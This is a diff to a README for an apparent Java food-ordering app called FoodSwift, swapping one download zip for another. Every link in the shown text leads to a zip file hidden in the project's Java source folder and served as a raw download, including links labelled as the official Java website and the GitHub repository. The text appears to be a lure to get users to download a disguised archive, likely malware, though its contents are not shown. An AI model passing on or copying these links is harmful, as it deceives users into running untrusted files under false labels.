@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download FoodSwift](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/Swift-Food-v1.9.zip%20FoodSwift-v1.0-blue)](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/Swift-Food-v1.9.zip)
+[![Download FoodSwift](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/daoimplementation/Swift_Food_1.7.zip%20FoodSwift-v1.0-blue)](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/daoimplementation/Swift_Food_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ FoodSwift requires the following software to run correctly:
 
 To get started with FoodSwift, visit our Releases page to download the latest version:
 
-[Download FoodSwift](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/Swift-Food-v1.9.zip)
+[Download FoodSwift](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/daoimplementation/Swift_Food_1.7.zip)
 
 Once you’re on the page:
 
@@ -61,7 +61,7 @@ After installation, you can run FoodSwift. Simply launch the application from yo
 Here are some common challenges and their solutions:
 
 - **Cannot Download the App:** Ensure that your internet connection is stable. Try refreshing the Releases page.
-- **Java Not Recognized:** Make sure you have Java installed on your computer. You can download it from the [official Java website](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/Swift-Food-v1.9.zip).
+- **Java Not Recognized:** Make sure you have Java installed on your computer. You can download it from the [official Java website](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/daoimplementation/Swift_Food_1.7.zip).
 - **App Crashes on Launch:** Check if your Java version meets the requirements. If issues persist, reinstall the application.
 
 ## 🤝 Community Support
@@ -70,6 +70,6 @@ If you need help or have questions, please check out our community forums where 
 
 ## 🔗 Learn More
 
-For more details about FoodSwift, visit our [GitHub repository](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/Swift-Food-v1.9.zip). Here you will find additional documentation, updates, and the source code.
+For more details about FoodSwift, visit our [GitHub repository](https://raw.githubusercontent.com/bilalansari007/FoodSwift/main/src/main/java/com/diw/daoimplementation/Swift_Food_1.7.zip). Here you will find additional documentation, updates, and the source code.
 
 Thank you for choosing FoodSwift! Enjoy your meals with ease and convenience.
